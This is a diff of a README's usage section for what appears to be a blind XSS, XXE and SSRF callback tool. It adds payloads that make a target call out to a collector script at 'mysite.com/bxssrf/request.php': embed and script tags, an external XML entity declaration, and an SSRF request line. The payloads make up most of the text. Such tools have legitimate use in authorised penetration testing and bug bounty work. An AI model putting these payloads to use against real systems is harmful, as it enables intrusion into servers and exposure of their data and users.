@@ -29,15 +29,24 @@
 - Ready.
 
 ### USAGE
-BLIND XSS EXAMPLE
+BLIND XSS 
 
 ```
+<embed src="http://mysite.com/bxssrf/request.php">
+<script src="http://mysite.com/bxssrf/request.php">
 ```
-BLIND XSS EXAMPLE
+BLIND XXE
 
 ```
+<?xml version="1.0" ?>
+<!DOCTYPE root [
+<!ENTITY % ext SYSTEM "http://mysite.com/bxssrf/request.php"> %ext;
+]>
+<r></r>
 ```
-BLIND XSS EXAMPLE
+SSRF
 
 ```
+GET /testssrf.php=http://mysite.com/bxssrf/request.php
+
 ```
